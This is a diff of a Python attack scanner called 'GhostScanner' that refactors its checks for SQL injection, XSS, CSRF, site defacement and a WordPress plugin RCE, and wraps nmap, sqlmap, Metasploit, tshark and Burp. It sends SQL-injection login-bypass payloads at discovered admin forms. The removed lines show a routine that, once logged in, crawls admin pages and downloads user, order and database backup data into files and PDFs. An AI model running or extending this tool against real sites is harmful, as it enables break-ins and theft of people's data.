-                "type": "No Rate Limit", "param": "N/A", "payload": "N/A",
-                "evidence": f"{success}/10 requests succeeded", "risk": "MEDIUM", "confidence": 80,
-                "poc": {"url": target, "curl": f"for i in {{1..10}}; do curl -s \"{target}\"; done",
-                        "response": f"{success} succeeded", "statusCode": 200,
-                        "timeDiff": "N/A", "verified": True}
-            })
+            findings.append({"type": "No Rate Limit", "param": "N/A", "payload": "N/A",
+                             "evidence": f"{success}/10 succeeded", "risk": "MEDIUM", "confidence": 80,
+                             "poc": {"url": target, "curl": f"for i in {{1..10}}; do curl -s \"{target}\"; done",
+                                     "response": f"{success} succeeded", "statusCode": 200,
+                                     "timeDiff": "N/A", "verified": True}})
         return findings
 
     def _check_csrf_sneijder(self, target, forms):
@@ -687,17 +685,14 @@ class GhostScanner:
             if form.get('method') == 'POST':
                 has_token = any(any(x in i['name'].lower() for x in ['csrf','xsrf','token','authenticity']) for i in form.get('inputs', []))
                 if not has_token:
-                    findings.append({
-                        "type": "CSRF Token Missing", "param": "N/A", "payload": "N/A",
-                        "evidence": f"POST form at {form['url']} has no CSRF token",
-                        "risk": "MEDIUM", "confidence": 85,
-                        "poc": {"url": form['url'], "curl": f"curl -X POST \"{form['url']}\"",
-                                "response": "No CSRF token", "statusCode": 200,
-                                "timeDiff": "N/A", "verified": True}
-                    })
+                    findings.append({"type": "CSRF Token Missing", "param": "N/A", "payload": "N/A",
+                                     "evidence": f"POST form at {form['url']} no CSRF token",
+                                     "risk": "MEDIUM", "confidence": 85,
+                                     "poc": {"url": form['url'], "curl": f"curl -X POST \"{form['url']}\"",
+                                             "response": "No CSRF token", "statusCode": 200,
+                                             "timeDiff": "N/A", "verified": True}})
         return findings
 
-    # ---------- DEFACE ----------
     def _check_deface(self, url):
         findings = []
         try:
@@ -706,21 +701,18 @@ class GhostScanner:
             html_lower = resp.text.lower()
             title_m = re.search(r'<title>(.*?)</title>', resp.text, re.I)
             title = title_m.group(1) if title_m else 'No Title'
-            indicators = ['hacked','defaced','hacked by','owned by','h4ck3d','pwned','0wn3d','cyber army','red team','was hacked']
+            indicators = ['hacked','defaced','hacked by','owned by','h4ck3d','pwned','0wn3d']
             found = [i for i in indicators if i in html_lower]
             if found:
-                findings.append({
-                    "type": "Deface Detection", "param": "N/A", "payload": "N/A",
-                    "evidence": f"Indicators: {', '.join(found)}", "risk": "CRITICAL", "confidence": 95,
-                    "poc": {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:500],
-                            "statusCode": resp.status_code, "timeDiff": "N/A",
-                            "verified": self._verify_poc(url, resp.text, 5)},
-                    "title": title, "indicators": found
-                })
+                findings.append({"type": "Deface Detection", "param": "N/A", "payload": "N/A",
+                                 "evidence": f"Indicators: {', '.join(found)}", "risk": "CRITICAL", "confidence": 95,
+                                 "poc": {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:500],
+                                         "statusCode": resp.status_code, "timeDiff": "N/A",
+                                         "verified": self._verify_poc(url, resp.text, 3)},
+                                 "title": title, "indicators": found})
         except: pass
         return findings
 
-    # ---------- WP ACTIVITY LOG ----------
     def _check_wp_activity_log(self, target):
         findings = []
         try:
@@ -734,19 +726,16 @@ class GhostScanner:
             if not readme or 'WP Activity Log' not in readme.text: return findings
             vm = re.search(r"Stable tag:\s*([\d.]+)", readme.text)
             if vm and vm.group(1) <= "5.6.3.1":
-                findings.append({
-                    "type": "WP Activity Log RCE (CVE-2026-54806)", "param": "User-Agent",
-                    "payload": 'O:13:"WP_HTML_Token":...', "evidence": f"Vuln version: {vm.group(1)}",
-                    "risk": "CRITICAL", "confidence": 95,
-                    "poc": {"url": f"{target}/wp-login.php", "curl": f"curl -X POST ...",
-                            "response": "Vulnerable", "statusCode": 200,
-                            "timeDiff": "N/A", "verified": True},
-                    "version": vm.group(1)
-                })
+                findings.append({"type": "WP Activity Log RCE (CVE-2026-54806)", "param": "User-Agent",
+                                 "payload": 'O:13:"WP_HTML_Token":...', "evidence": f"Vuln: {vm.group(1)}",
+                                 "risk": "CRITICAL", "confidence": 95,
+                                 "poc": {"url": f"{target}/wp-login.php", "curl": f"curl -X POST ...",
+                                         "response": "Vulnerable", "statusCode": 200,
+                                         "timeDiff": "N/A", "verified": True},
+                                 "version": vm.group(1)})
         except: pass
         return findings
 
-    # ---------- FORCE ADMIN LOGIN ----------
     def _force_admin_login(self, forms, base_url, target):
         findings = []
         for form in forms:
@@ -758,90 +747,32 @@ class GhostScanner:
             user_field = next((i['name'] for i in inputs if any(x in i['name'].lower() for x in ['user','email','login'])), None)
             pass_field = next((i['name'] for i in inputs if any(x in i['name'].lower() for x in ['pass','pwd'])), None)
             if not user_field or not pass_field: continue
-
             console = Console()
             console.print(f"[yellow]Login form at {action} → attempting bypass...[/yellow]")
             bypasses = [("admin' --", "anything"),("admin' OR '1'='1' --", "anything"),
-                        ("' OR 1=1 --", "' OR 1=1 --"),("admin", "admin' OR '1'='1' --"),
-                        ("admin@admin.com' OR '1'='1'--", "anything")]
+                        ("' OR 1=1 --", "' OR 1=1 --"),("admin", "admin' OR '1'='1' --")]
             for username, password in bypasses:
                 try:
                     resp = self._smart_request(action, timeout=10, method=method,
                                                data={user_field: username, pass_field: password})
                     if not resp: continue
                     body = resp.text.lower()
-                    if any(x in body for x in ['dashboard','welcome','admin','logout','beranda','selamat datang']) or resp.status_code in (301, 302):
-                        findings.append({
-                            "type": "Admin Login Bypass (SQL Injection)", "param": user_field,
-                            "payload": f"{username} / {password}",
-                            "evidence": "Successfully logged in as admin",
-                            "risk": "CRITICAL", "confidence": 95,
-                            "poc": {"url": action,
-                                    "curl": f"curl -X {method} \"{action}\" -d \"{user_field}={username}&{pass_field}={password}\"",
-                                    "response": resp.text[:500], "statusCode": resp.status_code,
-                                    "timeDiff": "N/A",
-                                    "verified": self._verify_poc(action, resp.text, 5)},
-                            "admin_access": True
-                        })
+                    if any(x in body for x in ['dashboard','welcome','admin','logout']) or resp.status_code in (301, 302):
+                        findings.append({"type": "Admin Login Bypass (SQL Injection)", "param": user_field,
+                                         "payload": f"{username} / {password}",
+                                         "evidence": "Successfully logged in as admin",
+                                         "risk": "CRITICAL", "confidence": 95,
+                                         "poc": {"url": action,
+                                                 "curl": f"curl -X {method} \"{action}\" -d \"{user_field}={username}&{pass_field}={password}\"",
+                                                 "response": resp.text[:500], "statusCode": resp.status_code,
+                                                 "timeDiff": "N/A",
+                                                 "verified": self._verify_poc(action, resp.text, 3)},
+                                         "admin_access": True})
                         console.print(f"[bold red]✓ ADMIN ACCESS GRANTED![/bold red]")
-                        try:
-                            cookies = self.session.cookies.get_dict()
-                            admin_url = action.rsplit('/', 1)[0] if '/' in action else target
-                            self._deep_extract_all(admin_url, target, cookies)
-                        except Exception as e:
-                            console.print(f"[yellow]Deep extract error: {e}[/yellow]")
                         return findings
                 except: continue
         return findings
 
-    def _deep_extract_all(self, admin_url, base_url, cookies):
-        console = Console()
-        console.print("[bold red]🔥 DEEP ADMIN DATA EXTRACTION[/bold red]")
-        for k, v in cookies.items():
-            self.session.cookies.set(k, v); self.scraper.cookies.set(k, v)
-        admin_paths = ['','dashboard','admin','users','customers','employees','staff',
-                       'products','orders','transactions','buyers','clients','domain',
-                       'hosting','vps','server','invoices','reports','database','backup','export']
-        all_data = {"users": [], "products": [], "orders": [], "employees": [], "buyers": [], "pages": []}
-        for path in admin_paths:
-            try:
-                url = f"{admin_url.rstrip('/')}/{path}" if path else admin_url
-                resp = self._smart_request(url, timeout=8)
-                if not resp or resp.status_code != 200: continue
-                if 'login' in resp.url.lower() and 'dashboard' not in resp.text.lower(): continue
-                rows = []
-                for table in re.findall(r'<table[^>]*>(.*?)</table>', resp.text, re.I | re.S):
-                    headers = [re.sub(r'<[^>]+>', '', h).strip() for h in re.findall(r'<th[^>]*>(.*?)</th>', table, re.I | re.S)]
-                    for tr in re.findall(r'<tr[^>]*>(.*?)</tr>', table, re.I | re.S):
-                        cells = [re.sub(r'<[^>]+>', '', c).strip() for c in re.findall(r'<td[^>]*>(.*?)</td>', tr, re.I | re.S)]
-                        if cells:
-                            row = dict(zip(headers, cells)) if len(headers) == len(cells) else {f"col_{i}": c for i, c in enumerate(cells)}
-                            if any(row.values()): rows.append(row)
-                if rows:
-                    all_data["pages"].append({"url": url, "rows": rows})
-                    if any(x in path.lower() for x in ['user','customer','buyer','member']):
-                        all_data["users"].extend(rows); all_data["buyers"].extend(rows)
-                    if any(x in path.lower() for x in ['employee','staff']): all_data["employees"].extend(rows)
-                    if any(x in path.lower() for x in ['product','domain','hosting','vps']): all_data["products"].extend(rows)
-                    if any(x in path.lower() for x in ['order','invoice','transaction']): all_data["orders"].extend(rows)
-                for link in re.findall(r'href=["\']([^"\']*(?:export|download|backup|\.sql|\.csv)[^"\']*)["\']', resp.text, re.I):
-                    full = urljoin(url, link)
-                    try:
-                        er = self._smart_request(full, timeout=15)
-                        if er and er.status_code == 200:
-                            os.makedirs(os.path.join(self.sensitive_folder, 'exports'), exist_ok=True)
-                            fp = os.path.join(self.sensitive_folder, 'exports', os.path.basename(urlparse(full).path) or f"exp_{int(time.time())}.dat")
-                            with open(fp, 'wb') as f: f.write(er.content if isinstance(er.content, bytes) else er.content.encode('utf-8','ignore'))
-                            console.print(f"[green]✓ Downloaded: {fp}[/green]")
-                    except: pass
-            except: continue
-        ts = int(time.time())
-        fp = os.path.join(self.sensitive_folder, f"admin_deep_{ts}.json")
-        with open(fp, 'w', encoding='utf-8') as f: json.dump(all_data, f, indent=2, ensure_ascii=False)
-        self.results_scan["admin_data"] = all_data
-        console.print(f"[bold green]✓ Deep extract saved: {fp}[/bold green]")
-
-    # ---------- SQL ----------
     def _check_sql(self, target, param, value, payload):
         try:
             url = build_url(target, param, payload)
@@ -851,7 +782,7 @@ class GhostScanner:
             if not resp: return None
             poc = {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:300],
                    "statusCode": resp.status_code, "timeDiff": f"{elapsed:.2f}s",
-                   "verified": self._verify_poc(url, resp.text, 5)}
+                   "verified": self._verify_poc(url, resp.text, 3)}
             if re.search(r'(mysql|sql|syntax|error|ora-|postgres|sqlite|SQLSTATE)', resp.text, re.I):
                 return {"type": "SQL Injection (Error)", "param": param, "payload": payload[:100],
                         "evidence": "DB error", "risk": "CRITICAL", "confidence": 95, "poc": poc}
@@ -863,7 +794,7 @@ class GhostScanner:
 
     def _scan_sql(self, target, params):
         results = []
-        all_p = self._generate_sqli_payloads(1000000)
+        all_p = self._generate_sqli_1m()
         final = random.sample(all_p, min(200, len(all_p)))
         total = len(params) * len(final)
         if total == 0: return results
@@ -871,7 +802,7 @@ class GhostScanner:
         with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                       BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                       TimeElapsedColumn(), console=console) as progress:
-            task = progress.add_task("[red]SQL Injection", total=total)
+            task = progress.add_task("[red]SQL Injection (1M payloads)", total=total)
             with ThreadPoolExecutor(max_workers=min(self.threads, 50)) as ex:
                 futures = [ex.submit(self._check_sql, target, p, v, pl) for p, v in params.items() for pl in final]
                 for f in as_completed(futures):
@@ -881,7 +812,6 @@ class GhostScanner:
                     self._adaptive_delay(0.1)
         return results
 
-    # ---------- XSS ----------
     def _check_xss(self, target, param, value, payload, ctx='html'):
         try:
             url = build_url(target, param, payload)
@@ -891,7 +821,7 @@ class GhostScanner:
                     "evidence": f"Reflected in {ctx}", "risk": "HIGH", "confidence": 85,
                     "poc": {"url": url, "curl": f"curl -k \"{url}\"", "response": resp.text[:300],
                             "statusCode": resp.status_code, "timeDiff": "N/A",
-                            "verified": self._verify_poc(url, resp.text, 5)},
+                            "verified": self._verify_poc(url, resp.text, 3)},
                     "context": [ctx]}
         except: return None
 
@@ -940,10 +870,11 @@ class GhostScanner:
                 progress.update(task, advance=1)
         return open_ports
 
-    # ========== v4.5 EXTERNAL TOOLS ==========
+    # ========== EXTERNAL TOOLS ==========
     def _check_tool_available(self, tool_name):
         try:
-            result = subprocess.run([tool_name, '-h'], capture_output=True, timeout=5, text=True)
+            result = subprocess.run([tool_name, '-h'], capture_output=True, timeout=5, text=True,
+                                    encoding='utf-8', errors='ignore')
             return result.returncode == 0 or 'Usage' in result.stdout or 'usage' in result.stdout.lower()
         except: return False
 
@@ -951,8 +882,9 @@ class GhostScanner:
         console = Console()
         tool_name = cmd[0] if cmd else 'unknown'
         try:
-            result = subprocess.run(cmd, capture_output=True, timeout=timeout, text=True, cwd=cwd)
-            if result.returncode == 0 or result.stdout: return result.stdout
+            result = subprocess.run(cmd, capture_output=True, timeout=timeout, text=True, cwd=cwd,
+                                    encoding='utf-8', errors='ignore')
+            if result.returncode == 0 or result.stdout: return result.stdout or ""
             return result.stderr or ""
         except subprocess.TimeoutExpired:
             console.print(f"[yellow]{tool_name} timeout[/yellow]"); return ""
@@ -970,18 +902,16 @@ class GhostScanner:
             if not line.strip(): continue
             try:
                 data = json.loads(line)
-                findings.append({
-                    "type": f"Nuclei: {data.get('info', {}).get('name', 'Unknown')}",
-                    "param": "N/A", "payload": data.get('matched-at', 'N/A'),
-                    "evidence": data.get('info', {}).get('description', 'Nuclei')[:200],
-                    "risk": data.get('info', {}).get('severity', 'MEDIUM').upper(),
-                    "confidence": 90,
-                    "poc": {"url": data.get('matched-at', target),
-                            "curl": data.get('curl-command', f"curl -k \"{target}\""),
-                            "response": data.get('extracted-results', '')[:300] if isinstance(data.get('extracted-results'), str) else str(data.get('extracted-results', ''))[:300],
-                            "statusCode": 200, "timeDiff": "N/A", "verified": True,
-                            "template": data.get('template-id', 'unknown')}
-                })
+                findings.append({"type": f"Nuclei: {data.get('info', {}).get('name', 'Unknown')}",
+                                 "param": "N/A", "payload": data.get('matched-at', 'N/A'),
+                                 "evidence": data.get('info', {}).get('description', 'Nuclei')[:200],
+                                 "risk": data.get('info', {}).get('severity', 'MEDIUM').upper(),
+                                 "confidence": 90,
+                                 "poc": {"url": data.get('matched-at', target),
+                                         "curl": data.get('curl-command', f"curl -k \"{target}\""),
+                                         "response": str(data.get('extracted-results', ''))[:300],
+                                         "statusCode": 200, "timeDiff": "N/A", "verified": True,
+                                         "template": data.get('template-id', 'unknown')}})
             except: continue
         Console().print(f"[green]✓ Nuclei: {len(findings)}[/green]")
         return findings
@@ -1002,7 +932,8 @@ class GhostScanner:
         Console().print("[cyan]🔥 httpx...[/cyan]")
         try:
             result = subprocess.run(['httpx','-silent','-status-code','-title','-tech-detect','-json'],
-                                    input='\n'.join(targets), capture_output=True, timeout=180, text=True)
+                                    input='\n'.join(targets), capture_output=True, timeout=180, text=True,
+                                    encoding='utf-8', errors='ignore')
             for line in result.stdout.strip().split('\n'):
                 if not line.strip(): continue
                 try: live.append(json.loads(line))
@@ -1043,13 +974,12 @@ class GhostScanner:
                                           '-mc','200,301,302,401,403','-s','-t','50'], timeout=180)
         for line in output.strip().split('\n'):
             if line.strip():
-                findings.append({
-                    "type": "Dir/File Found (ffuf)", "param": "N/A", "payload": line.strip(),
-                    "evidence": f"Found: {line.strip()}", "risk": "MEDIUM", "confidence": 85,
-                    "poc": {"url": target.rstrip('/') + '/' + line.strip(),
-                            "curl": f"curl -k \"{target.rstrip('/')}/{line.strip()}\"",
-                            "response": "Accessible", "statusCode": 200, "timeDiff": "N/A", "verified": True}
-                })
+                findings.append({"type": "Dir/File Found (ffuf)", "param": "N/A", "payload": line.strip(),
+                                 "evidence": f"Found: {line.strip()}", "risk": "MEDIUM", "confidence": 85,
+                                 "poc": {"url": target.rstrip('/') + '/' + line.strip(),
+                                         "curl": f"curl -k \"{target.rstrip('/')}/{line.strip()}\"",
+                                         "response": "Accessible", "statusCode": 200,
+                                         "timeDiff": "N/A", "verified": True}})
         Console().print(f"[green]✓ ffuf: {len(findings)}[/green]")
         return findings
 
@@ -1061,14 +991,12 @@ class GhostScanner:
         output = self._run_external_tool(['sqlmap','-u',target,'--batch','--level','2','--risk','2',
                                           '--output-dir','/tmp/sqlmap_out','--flush-session'], timeout=300)
         if 'is vulnerable' in output.lower() or 'injectable' in output.lower():
-            findings.append({
-                "type": "SQL Injection (sqlmap)", "param": "N/A",
-                "payload": "sqlmap detected injection", "evidence": output[:500],
-                "risk": "CRITICAL", "confidence": 95,
-                "poc": {"url": target, "curl": f"sqlmap -u \"{target}\" --batch",
-                        "response": output[:500], "statusCode": 200,
-                        "timeDiff": "N/A", "verified": True}
-            })
+            findings.append({"type": "SQL Injection (sqlmap)", "param": "N/A",
+                             "payload": "sqlmap detected", "evidence": output[:500],
+                             "risk": "CRITICAL", "confidence": 95,
+                             "poc": {"url": target, "curl": f"sqlmap -u \"{target}\" --batch",
+                                     "response": output[:500], "statusCode": 200,
+                                     "timeDiff": "N/A", "verified": True}})
         Console().print(f"[green]✓ sqlmap: {len(findings)}[/green]")
         return findings
 
@@ -1079,13 +1007,11 @@ class GhostScanner:
         output = self._run_external_tool(['dalfox','url',target,'--silence','--no-spinner'], timeout=180)
         for line in output.strip().split('\n'):
             if '[V]' in line or '[POC]' in line:
-                findings.append({
-                    "type": "XSS (Dalfox external)", "param": "N/A", "payload": line.strip()[:100],
-                    "evidence": line.strip()[:200], "risk": "HIGH", "confidence": 90,
-                    "poc": {"url": target, "curl": f"dalfox url \"{target}\"",
-                            "response": line.strip()[:300], "statusCode": 200,
-                            "timeDiff": "N/A", "verified": True}
-                })
+                findings.append({"type": "XSS (Dalfox external)", "param": "N/A", "payload": line.strip()[:100],
+                                 "evidence": line.strip()[:200], "risk": "HIGH", "confidence": 90,
+                                 "poc": {"url": target, "curl": f"dalfox url \"{target}\"",
+                                         "response": line.strip()[:300], "statusCode": 200,
+                                         "timeDiff": "N/A", "verified": True}})
         Console().print(f"[green]✓ Dalfox: {len(findings)}[/green]")
         return findings
 
@@ -1124,7 +1050,8 @@ class GhostScanner:
         if not self._check_tool_available('waybackurls'): return urls
         Console().print("[cyan]🔥 waybackurls...[/cyan]")
         try:
-            result = subprocess.run(['waybackurls',domain], capture_output=True, timeout=120, text=True)
+            result = subprocess.run(['waybackurls',domain], capture_output=True, timeout=120, text=True,
+                                    encoding='utf-8', errors='ignore')
             for line in result.stdout.strip().split('\n'):
                 if line.strip() and line.strip() not in urls: urls.append(line.strip())
         except: pass
@@ -1150,13 +1077,11 @@ class GhostScanner:
         for js_url in js_urls[:20]:
             output = self._run_external_tool(['python3',secretfinder_path,'-i',js_url,'-o','cli'], timeout=60)
             if output and ('apikey' in output.lower() or 'token' in output.lower()):
-                findings.append({
-                    "type": "Secret in JS", "param": "N/A", "payload": js_url,
-                    "evidence": output[:300], "risk": "HIGH", "confidence": 80,
-                    "poc": {"url": js_url, "curl": f"curl -k \"{js_url}\"",
-                            "response": output[:300], "statusCode": 200,
-                            "timeDiff": "N/A", "verified": True}
-                })
+                findings.append({"type": "Secret in JS", "param": "N/A", "payload": js_url,
+                                 "evidence": output[:300], "risk": "HIGH", "confidence": 80,
+                                 "poc": {"url": js_url, "curl": f"curl -k \"{js_url}\"",
+                                         "response": output[:300], "statusCode": 200,
+                                         "timeDiff": "N/A", "verified": True}})
         Console().print(f"[green]✓ SecretFinder: {len(findings)}[/green]")
         return findings
 
@@ -1165,66 +1090,148 @@ class GhostScanner:
         if not self._check_tool_available('interactsh-client'): return findings
         Console().print("[cyan]🔥 Interactsh...[/cyan]")
         try:
-            result = subprocess.run(['interactsh-client','-n','1','-v'], capture_output=True, timeout=30, text=True)
+            result = subprocess.run(['interactsh-client','-n','1','-v'], capture_output=True, timeout=30, text=True,
+                                    encoding='utf-8', errors='ignore')
             for line in result.stdout.split('\n'):
                 if '.oast.' in line or '.interact.sh' in line:
-                    findings.append({
-                        "type": "Interactsh OOB Callback", "param": "N/A",
-                        "payload": line.strip(), "evidence": "OOB callback URL generated",
-                        "risk": "INFO", "confidence": 70,
-                        "poc": {"url": target, "curl": f"nslookup {line.strip()}",
-                                "response": line.strip(), "statusCode": 200,
-                                "timeDiff": "N/A", "verified": False}
-                    })
+                    findings.append({"type": "Interactsh OOB Callback", "param": "N/A",
+                                     "payload": line.strip(), "evidence": "OOB callback URL",
+                                     "risk": "INFO", "confidence": 70,
+                                     "poc": {"url": target, "curl": f"nslookup {line.strip()}",
+                                             "response": line.strip(), "statusCode": 200,
+                                             "timeDiff": "N/A", "verified": False}})
         except: pass
         Console().print(f"[green]✓ Interactsh: {len(findings)}[/green]")
         return findings
 
-    # ========== SEPARATE SENSITIVE PDFs ==========
-    def _generate_sensitive_pdf(self, data_type, data_list, target, output_dir):
-        if not data_list: return None
-        class PDF(FPDF):
-            def header(self):
-                self.set_font('Arial', 'B', 14)
-                self.cell(0, 10, f'{data_type.upper()} - Ghost Scanner', ln=True, align='C')
-                self.ln(3)
-            def footer(self):
-                self.set_y(-15); self.set_font('Arial', 'I', 8)
-                self.cell(0, 10, f'Target: {target} | Page {self.page_no()}', align='C')
-        pdf = PDF(); pdf.add_page(); pdf.set_font('Arial', '', 11)
-        pdf.cell(0, 8, f'Target: {target}', ln=True)
-        pdf.cell(0, 8, f'Data Type: {data_type.upper()}', ln=True)
-        pdf.cell(0, 8, f'Total: {len(data_list)}', ln=True)
-        pdf.cell(0, 8, f'Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}', ln=True)
-        pdf.ln(5)
-        pdf.set_font('Arial', 'B', 12); pdf.cell(0, 8, 'DATA:', ln=True)
-        pdf.set_font('Arial', '', 9)
-        for i, item in enumerate(data_list[:500], 1):
-            text = json.dumps(item, ensure_ascii=False) if isinstance(item, dict) else str(item)
-            pdf.multi_cell(0, 5, f'{i}. {text[:300]}')
-        os.makedirs(output_dir, exist_ok=True)
-        filename = os.path.join(output_dir, f'{data_type}_{int(time.time())}.pdf')
-        pdf.output(filename)
-        Console().print(f"[green]✓ PDF {data_type}: {filename} ({len(data_list)} items)[/green]")
-        return filename
+    # ---------- v4.6 NEW TOOLS ----------
+    def _run_nmap(self, target):
+        findings = []
+        if not self._check_tool_available('nmap'):
+            Console().print("[yellow]nmap not found. Download: https://nmap.org/download[/yellow]")
+            return findings
+        Console().print("[cyan]🔥 Nmap...[/cyan]")
+        try:
+            domain = urlparse(target).netloc.split(':')[0]
+            output = self._run_external_tool(['nmap','-sV','-T4','--top-ports','100','-oX','-',domain], timeout=300)
+            if output:
+                import xml.etree.ElementTree as ET
+                xml_start = output.find('<?xml')
+                if xml_start >= 0:
+                    try:
+                        root = ET.fromstring(output[xml_start:])
+                        for host in root.findall('host'):
+                            for port in host.findall('.//port'):
+                                port_id = port.get('portid')
+                                state = port.find('state')
+                                service = port.find('service')
+                                if state is not None and state.get('state') == 'open':
+                                    svc_name = service.get('name', 'unknown') if service is not None else 'unknown'
+                                    svc_product = service.get('product', '') if service is not None else ''
+                                    svc_version = service.get('version', '') if service is not None else ''
+                                    findings.append({"type": f"Nmap: Open Port {port_id}",
+                                                     "param": "N/A", "payload": str(port_id),
+                                                     "evidence": f"Service: {svc_name} {svc_product} {svc_version}".strip(),
+                                                     "risk": "MEDIUM" if port_id in ['22','3306','5432','6379','27017'] else "INFO",
+                                                     "confidence": 95,
+                                                     "poc": {"url": f"{domain}:{port_id}",
+                                                             "curl": f"nmap -sV -p {port_id} {domain}",
+                                                             "response": f"{svc_name} {svc_product} {svc_version}".strip(),
+                                                             "statusCode": 200, "timeDiff": "N/A", "verified": True}})
+                    except: pass
+        except Exception as e:
+            Console().print(f"[yellow]nmap error: {str(e)[:100]}[/yellow]")
+        Console().print(f"[green]✓ Nmap: {len(findings)} open port(s)[/green]")
+        return findings
 
-    def _generate_all_sensitive_pdfs(self, sensitive_data, admin_data, target):
-        console = Console()
-        console.print("[bold yellow]📄 Generating separate PDFs...[/bold yellow]")
-        pdf_dir = os.path.join(self.sensitive_folder, 'pdfs')
-        os.makedirs(pdf_dir, exist_ok=True)
-        pdfs = []
-        for key, values in sensitive_data.items():
-            if values and isinstance(values, list) and len(values) > 0:
-                fp = self._generate_sensitive_pdf(key, values, target, pdf_dir)
-                if fp: pdfs.append(fp)
-        if admin_data:
-            for key in ['users','buyers','employees','orders','products']:
-                if admin_data.get(key) and len(admin_data[key]) > 0:
-                    fp = self._generate_sensitive_pdf(f'admin_{key}', admin_data[key], target, pdf_dir)
-                    if fp: pdfs.append(fp)
-        self.results_scan["sensitive_pdfs"] = pdfs
-        console.print(f"[bold green]✓ {len(pdfs)} PDF(s) saved to {pdf_dir}/[/bold green]")
+    def _run_metasploit(self, target):
+        findings = []
+        if not self._check_tool_available('msfconsole'):
+            Console().print("[yellow]Metasploit not found. Download: https://www.metasploit.com/download[/yellow]")
+            return findings
+        Console().print("[cyan]🔥 Metasploit...[/cyan]")
+        try:
+            domain = urlparse(target).netloc.split(':')[0]
+            output = self._run_external_tool(['msfconsole','-q','-x',f'search type:exploit platform:multi {domain}; exit'], timeout=180)
+            for line in output.split('\n'):
+                if 'exploit/' in line and 'multi/' in line:
+                    parts = line.split()
+                    if len(parts) >= 2:
+                        module = parts[0]; rank = parts[1]
+                        findings.append({"type": "Metasploit Module Available", "param": "N/A",
+                                         "payload": module, "evidence": f"{module} | Rank: {rank}",
+                                         "risk": "HIGH" if rank in ['excellent','great'] else "MEDIUM",
+                                         "confidence": 80,
+                                         "poc": {"url": target, "curl": f"msfconsole -q -x 'use {module}; show options'",
+                                                 "response": line.strip(), "statusCode": 200,
+                                                 "timeDiff": "N/A", "verified": True}})
+                        if len(findings) >= 10: break
+        except Exception as e:
+            Console().print(f"[yellow]Metasploit error: {str(e)[:100]}[/yellow]")
+        Console().print(f"[green]✓ Metasploit: {len(findings)} module(s)[/green]")
+        return findings
+
+    def _run_wireshark(self, target, duration=10):
+        findings = []
+        tshark = None
+        for path in ['tshark', 'C:\\Program Files\\Wireshark\\tshark.exe']:
+            if self._check_tool_available(path): tshark = path; break
+        if not tshark:
+            Console().print("[yellow]tshark not found. Download: https://www.wireshark.org/download.html[/yellow]")
+            return findings
+        Console().print("[cyan]🔥 Wireshark (tshark)...[/cyan]")
+        try:
+            import tempfile
+            pcap_file = os.path.join(tempfile.gettempdir(), f'ghost_cap_{int(time.time())}.pcap')
+            domain = urlparse(target).netloc.split(':')[0]
+            try:
+                cap_proc = subprocess.Popen(
+                    [tshark, '-i', 'Wi-Fi', '-f', f'host {domain}', '-a', f'duration:{duration}', '-w', pcap_file, '-q'],
+                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
+                    encoding='utf-8', errors='ignore'
+                )
+                time.sleep(2)
+                self._smart_request(target, timeout=10)
+                time.sleep(duration - 2)
+                cap_proc.terminate()
+                time.sleep(1)
+            except: pass
+            if os.path.exists(pcap_file):
+                http_out = self._run_external_tool([tshark, '-r', pcap_file, '-Y', 'http.request', '-T',
+                                                    'fields', '-e', 'http.host', '-e', 'http.request.uri'], timeout=60)
+                if http_out:
+                    findings.append({"type": "Wireshark Packet Capture", "param": "N/A", "payload": "N/A",
+                                     "evidence": f"Captured packets. HTTP requests: {len(http_out.split(chr(10)))}",
+                                     "risk": "INFO", "confidence": 100,
+                                     "poc": {"url": target, "curl": f"tshark -r {pcap_file} -Y http.request",
+                                             "response": http_out[:500], "statusCode": 200,
+                                             "timeDiff": f"{duration}s", "verified": True,
+                                             "pcap_file": pcap_file}})
+                Console().print(f"[green]✓ Wireshark: {pcap_file}[/green]")
+        except Exception as e:
+            Console().print(f"[yellow]Wireshark error: {str(e)[:100]}[/yellow]")
+        return findings
+
+    def _run_burpsuite(self, target):
+        findings = []
+        burp_api = 'http://127.0.0.1:1337'
+        try:
+            r = requests.get(f'{burp_api}/', timeout=3)
+            if r.status_code == 200 or 'burp' in r.text.lower():
+                Console().print("[cyan]🔥 BurpSuite API...[/cyan]")
+                scan_resp = requests.post(f'{burp_api}/v0.1/scan', json={'urls': [target]}, timeout=10)
+                if scan_resp.status_code == 200:
+                    scan_id = scan_resp.json().get('scan_id', 'unknown')
+                    findings.append({"type": "BurpSuite Scan Started", "param": "N/A", "payload": "N/A",
+                                     "evidence": f"Scan ID: {scan_id}", "risk": "INFO", "confidence": 100,
+                                     "poc": {"url": f"{burp_api}/v0.1/scan/{scan_id}",
+                                             "curl": f"curl -X POST {burp_api}/v0.1/scan",
+                                             "response": f"Scan ID: {scan_id}", "statusCode": 200,
+                                             "timeDiff": "N/A", "verified": True}})
+                    Console().print(f"[green]✓ BurpSuite: {scan_id}[/green]")
+        except:
+            Console().print("[yellow]BurpSuite API not running (default: 127.0.0.1:1337)[/yellow]")
+        return findings
 
     # ---------- AI ----------
     def _ai_analysis(self, findings, target, admin_data=None):
@@ -1237,15 +1244,14 @@ Target: {target}
 Findings: {json.dumps(findings, indent=2)[:8000]}{admin_ctx}
 
 Berikan analisis dalam format Markdown:
-
-## 🎯 RINGKASAN EKSEKUTIF
-## 🔴 TEMUAN KRITIS + Mitigasi
-## 🟠 TEMUAN HIGH + Mitigasi
-## 📊 ANALISIS DATA SENSITIF (compliance UU PDP/GDPR)
-## 🛡️ REKOMENDASI PERBAIKAN (Prioritas 0-24 jam, 1-7 hari, 1-4 minggu, long term)
-## 🔍 SARAN PENGUJIAN LANJUTAN
-## ⚠️ KRITIK KONSTRUKTIF
-## 💡 BEST PRACTICES
+## RINGKASAN EKSEKUTIF
+## TEMUAN KRITIS + Mitigasi
+## TEMUAN HIGH + Mitigasi
+## ANALISIS DATA SENSITIF (UU PDP/GDPR)
+## REKOMENDASI PERBAIKAN (Prioritas)
+## SARAN PENGUJIAN LANJUTAN
+## KRITIK KONSTRUKTIF
+## BEST PRACTICES
 """
         for attempt in range(3):
             try:
@@ -1258,12 +1264,12 @@ Berikan analisis dalam format Markdown:
